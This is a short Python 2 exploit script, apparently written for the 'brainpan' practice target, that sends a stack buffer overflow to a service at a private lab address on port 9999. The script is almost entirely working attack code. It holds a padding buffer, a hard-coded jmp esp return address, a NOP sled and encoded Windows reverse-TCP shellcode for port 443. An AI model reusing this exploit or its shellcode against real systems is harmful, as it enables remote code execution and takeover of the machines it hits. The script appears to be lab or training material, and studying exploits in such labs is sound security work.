#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: windows/shell/reverse_tcp port 443
shellcode = ("\xbb\xe6\x7c\x37\xc4\xda\xce\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x4f\x83\xea\xfc\x31\x5a\x10\x03\x5a\x10\x04\x89\xcb\x2c\x41"
"\x72\x34\xad\x31\xfa\xd1\x9c\x63\x98\x92\x8d\xb3\xea\xf7\x3d"
"\x38\xbe\xe3\xb6\x4c\x17\x03\x7e\xfa\x41\x2a\x7f\xcb\x4d\xe0"
"\x43\x4a\x32\xfb\x97\xac\x0b\x34\xea\xad\x4c\x29\x05\xff\x05"
"\x25\xb4\xef\x22\x7b\x05\x0e\xe5\xf7\x35\x68\x80\xc8\xc2\xc2"
"\x8b\x18\x7a\x59\xc3\x80\xf0\x05\xf4\xb1\xd5\x56\xc8\xf8\x52"
"\xac\xba\xfa\xb2\xfd\x43\xcd\xfa\x51\x7a\xe1\xf6\xa8\xba\xc6"
"\xe8\xdf\xb0\x34\x94\xe7\x02\x46\x42\x62\x97\xe0\x01\xd4\x73"
"\x10\xc5\x82\xf0\x1e\xa2\xc1\x5f\x03\x35\x06\xd4\x3f\xbe\xa9"
"\x3b\xb6\x84\x8d\x9f\x92\x5f\xac\x86\x7e\x31\xd1\xd9\x27\xee"
"\x77\x91\xca\xfb\x01\xf8\x82\xc8\x3f\x03\x53\x47\x48\x70\x61"
"\xc8\xe2\x1e\xc9\x81\x2c\xd8\x2e\xb8\x88\x76\xd1\x43\xe8\x5f"
"\x16\x17\xb8\xf7\xbf\x18\x53\x08\x3f\xcd\xf3\x58\xef\xbe\xb3"
"\x08\x4f\x6f\x5b\x43\x40\x50\x7b\x6c\x8a\xe7\xbc\xfb\xf5\x50"
"\x48\xfd\x9d\xa2\x4c\xfc\xe6\x2a\xaa\x94\x08\x7b\x65\x01\xb0"
"\x26\xfd\xb0\x3d\xfd\x95\x51\xaf\x9a\x65\x1f\xcc\x34\x32\x48"
"\x22\x4d\xd6\x64\x1d\xe7\xc4\x74\xfb\xc0\x4c\xa3\x38\xce\x4d"
"\x26\x04\xf4\x5d\xfe\x85\xb0\x09\xae\xd3\x6e\xe7\x08\x8a\xc0"
"\x51\xc3\x61\x8b\x35\x92\x49\x0c\x43\x9b\x87\xfa\xab\x2a\x7e"
"\xbb\xd4\x83\x16\x4b\xad\xf9\x86\xb4\x64\xba\xb7\xfe\x24\xeb"
"\x5f\xa7\xbd\xa9\x3d\x58\x68\xed\x3b\xdb\x98\x8e\xbf\xc3\xe9"
"\x8b\x84\x43\x02\xe6\x95\x21\x24\x55\x95\x63")

#jmp esp found at 0x7e429353
ret = "\x53\x93\x42\x7e"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 524 + ret + '\x90' * 16 + shellcode

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("192.168.10.101",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




